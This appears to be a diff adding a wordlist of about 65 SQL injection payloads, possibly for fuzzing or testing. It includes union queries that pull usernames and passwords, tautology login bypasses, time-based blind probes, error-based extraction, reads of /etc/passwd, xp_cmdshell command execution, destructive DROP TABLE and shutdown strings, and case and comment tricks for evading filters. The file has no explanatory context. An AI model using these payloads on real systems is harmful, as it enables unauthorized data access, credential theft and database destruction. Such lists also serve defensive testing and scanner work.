@@ -1,0 +1,65 @@
+1 union select 1,2,3
+1 UNION ALL SELECT username,password FROM users
+-1 union select null,version()--
+1 or 1=1
+1 OR 1=1--
+1) or (1=1
+1 and 1=2 union select 1
+1 and sleep(5)
+1;drop table users
+1; DROP TABLE users--
+1 order by 3--
+1 having 1=1
+1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)
+1 or true
+-1 or 2>1
+1 or 0x50=0x50
+1 and ascii(substring((select database()),1,1))>64
+1 and extractvalue(1,concat(0x7e,version()))
+1 procedure analyse()
+1;select pg_sleep(5)
+1 rlike sleep(1)
+1 or benchmark(10000000,md5(1))
+1 and 1 in (select 1)
+1 union select load_file('/etc/passwd')
+1 into outfile '/tmp/x'
+' or '1'='1
+' OR 1=1--
+admin'--
+admin' #
+admin'/*
+' or ''='
+" or ""="
+" or 1=1#
+') or ('1'='1
+' union select null,null--
+1' and '1'='1
+' or 1=1 limit 1 -- -
+'; exec xp_cmdshell 'dir'--
+' AND 1=CONVERT(int,@@version)--
+'; waitfor delay '0:0:5'--
+1' AND SLEEP(5) AND '1'='1
+' or 'a'='a
+'||'
+'||(select 1)||'
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+' HAVING 1=1--
+' GROUP BY columnnames having 1=1 --
+1' ORDER BY 1--+
+' or sleep(5)#
+admin") or ("1"="1
+1' or '1'='1' /*
+' and 1 in (select min(name) from sysobjects)--
+'; shutdown--
+' or username like '%admin%
+x' or 1=1 or 'x'='y
+Robert'); DROP TABLE Students;--
+1' and extractvalue(1,concat(0x7e,(select user())))--
+' union all select @@version--
+1 UnIoN/**/SeLeCt 1,2
+1/**/or/**/1=1
+1 /*!union*/ /*!select*/ 1
+'/**/or/**/'1'='1
+1 union%0aselect 1
+1'/**/UnIoN/**/SeLeCt/**/1--
+1 uNiOn aLl sElEcT nUlL--
